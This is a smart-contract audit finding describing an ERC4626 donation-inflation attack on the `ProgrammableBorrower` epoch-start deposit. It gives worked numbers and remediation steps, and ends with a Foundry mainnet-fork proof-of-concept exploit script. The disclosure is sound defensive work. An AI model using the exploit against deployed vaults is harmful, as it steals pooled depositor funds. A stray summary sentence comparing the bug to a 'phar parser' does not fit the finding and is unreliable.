### Title
ERC4626 share-price inflation steals idle pool funds during programmable-borrower epoch start - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` deposits all idle pool assets into its configured ERC4626 vault without a minimum-share or slippage bound. An unprivileged vault user can first inflate the vault’s assets-per-share through a donation, cause the borrower contract to mint too few shares at epoch start, and redeem its own inflated shares for a profit. The missing share boundary is analogous to the phar parser trusting malformed length metadata and reading past the real object.

### Finding Description
When `IdleCDOEpochVariant.startEpoch` sends idle underlying to the programmable borrower, it invokes the programmable-borrower start hook afterward [1](#0-0) . `onStartEpoch` deposits the contract’s entire underlying balance into the configured ERC4626 vault [2](#0-1) .

The internal `_depositToVault` helper calls `vault.deposit` but does not verify the number of shares returned, enforce a minimum share amount, or bound the pre-deposit `convertToAssets` exchange rate [3](#0-2) . Subsequent accounting trusts the vault’s `convertToAssets` result as the value of the borrower contract’s position [4](#0-3) .

If the vault has a very low share supply, an attacker can:

1. Deposit `1` unit and receive approximately `1` share.
2. Donate enough underlying to make `totalAssets / totalSupply` slightly greater than half of the upcoming pool deposit.
3. Let the honest manager call `startEpoch`; the pool deposit mints only one share because ERC4626 share calculation rounds down.
4. Redeem the attacker’s share for roughly half of the enlarged vault.

For example, with a pool deposit of `1_000_000` units:

- Attacker deposits `1`, then donates `500_000`; the vault has `500_001` assets and `1` share.
- The borrower’s `1_000_000`-unit deposit mints `floor(1_000_000 / 500_001) = 1` share.
- The vault then has `1_500_001` assets and `2` shares.
- The attacker redeems their share for `750_000`, a `249_999` profit over their `500_001` cost.
- The borrower contract’s remaining share is worth approximately `750_001`, creating an approximately `250_000`, or 25%, loss to the pool.

### Impact Explanation
This is direct theft of pool assets and a solvency invariant violation. The pool transfers `1_000_000` units into the programmable borrower, but only about `750_001` remains economically recoverable after the attacker redemption.

The loss is surfaced as vault PnL: `epochStartVaultAssets` records the full pre-deposit balance, while `_vaultNetInterest` later compares the reduced vault value against that baseline [5](#0-4) . At stop time, the reduced balance can either lower realized interest/NAV or make the requested repayment impossible, pushing the CDO into the default path [6](#0-5) .

The maximum practical loss depends on vault liquidity and rounding. For an attacked deposit `P`, forcing the pool to receive one share while the attacker holds one share can steal nearly `P / 4`; larger relative losses occur when the pool deposit rounds down to zero shares.

### Likelihood Explanation
The attacker is an ordinary ERC4626 vault user, which is explicitly unprivileged in the threat model. No owner, manager, guardian, borrower, or queue misbehavior is required.

The exploit is strongest when the configured vault has zero or very low share supply relative to the pool deposit. If the vault already has substantial third-party liquidity, donation inflation is diluted and may not be profitable. The attacker can prepare the vault state immediately before an honest `startEpoch` transaction and redeem afterward, so no privileged timing control is needed.

Existing checks do not prevent this. `onStartEpoch` snapshots the pool’s cash and current vault assets before the deposit, but it does not validate that the new deposit receives a fair number of shares [7](#0-6) . There is also no minimum-liquidity requirement, dead-share requirement, maximum acceptable share price, or post-deposit loss check.

### Recommendation
Protect vault deposits with an explicit exchange-rate boundary:

- Use an ERC4626 interface supporting `mint` with a maximum-asset bound, or replace `deposit` with a wrapper that checks `sharesReceived >= minShares`.
- Compute `minShares` from a stored or operator-supplied maximum assets-per-share ratio.
- Revert `onStartEpoch` if the vault’s share price exceeds a configured bound or its share supply is below a configured minimum.
- Prefer vaults with virtual shares/assets or permanently locked seed liquidity to make first-depositor inflation ineffective.
- After depositing, compare `vault.convertToAssets(returnedShares)` with the deposited amount and revert if the shortfall exceeds a bounded rounding tolerance.
- Seed new programmable-borrower vaults with dead shares before connecting them to the CDO.

A defense-in-depth check should also verify that `_currentVaultAssets()` did not drop materially immediately after `_depositToVault`.

### Proof of Concept
The following Foundry PoC assumes a fork where `CDO` is the configured `IdleCDOEpochVariant`, `PROGRAMMABLE_BORROWER` is its borrower adapter, and the configured ERC4626 vault initially has zero or negligible share supply. The vault must accept direct underlying transfers.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC4626} from "../contracts/interfaces/IERC4626.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {ProgrammableBorrower} from "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract ProgrammableBorrowerVaultInflationPoC is Test {
    IdleCDOEpochVariant internal cdo =
        IdleCDOEpochVariant(vm.envAddress("CDO"));
    ProgrammableBorrower internal borrowerAdapter =
        ProgrammableBorrower(vm.envAddress("PROGRAMMABLE_BORROWER"));

    IERC4626 internal vault;
    IERC20Detailed internal asset;
    IdleCreditVault internal creditVault;

    address internal attacker = makeAddr("attacker");
    address internal manager;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC"));

        vault = borrowerAdapter.vault();
        creditVault = IdleCreditVault(cdo.strategy());
        asset = IERC20Detailed(cdo.token());
        manager = creditVault.manager();

        // Preconditions:
        // 1. The CDO is in a buffer period and startEpoch is callable.
        // 2. The configured vault has zero or negligible share supply.
        // 3. There are no pending instant withdrawals for simplicity.
        assertEq(creditVault.pendingInstantWithdraws(), 0);
    }

    function testEpochStartDepositShareInflation() public {
        // The funds startEpoch will move through the programmable borrower.
        uint256 poolDeposit = asset.balanceOf(address(creditVault));
        vm.assume(poolDeposit >= 1_000_000);

        // Make assets-per-share slightly greater than poolDeposit / 2.
        uint256 attackerCost = poolDeposit / 2 + 1;
        deal(address(asset), attacker, attackerCost);

        vm.startPrank(attacker);

        // Empty-vault deposit: attacker receives one share for one asset.
        asset.approve(address(vault), 1);
        uint256 attackerShares = vault.deposit(1, attacker);
        assertEq(attackerShares, 1);

        // Direct donation inflates convertToAssets(1 share).
        asset.transfer(address(vault), attackerCost - 1);

        vm.stopPrank();

        // Honest manager starts the epoch. IdleCDO sends the pool cash to the
        // ProgrammableBorrower, which deposits all of it into the vault.
        vm.prank(manager);
        cdo.startEpoch();

        uint256 borrowerShares = vault.balanceOf(address(borrowerAdapter));

        // With poolDeposit = 1_000_000 and attackerCost = 500_001:
        // floor(1_000_000 / 500_001) == 1 share.
        assertEq(borrowerShares, 1);

        uint256 attackerBalanceBefore = asset.balanceOf(attacker);

        vm.prank(attacker);
        uint256 attackerReceived =
            vault.redeem(attackerShares, attacker, attacker);

        // Expected exact values for poolDeposit == 1_000_000:
        // vault assets = 1_500_001, vault shares = 2.
        // attacker receives 750_000 after spending 500_001.
        assertGt(attackerReceived, attackerCost);
        assertEq(
            asset.balanceOf(attacker) - attackerBalanceBefore,
            attackerReceived
        );

        // The borrower adapter's remaining share now backs substantially less
        // than the poolDeposit moved by the honest manager.
        uint256 remainingBorrowerValue =
            vault.convertToAssets(vault.balanceOf(address(borrowerAdapter)));

        assertLt(remainingBorrowerValue, poolDeposit);
        assertApproxEqAbs(
            poolDeposit - remainingBorrowerValue,
            poolDeposit / 4,
            2
        );
    }
}
```

For `poolDeposit = 1_000_000`, the assertions quantify the exploit as a `249_999`-unit attacker profit and an approximately `250_000`-unit loss to pool backing.
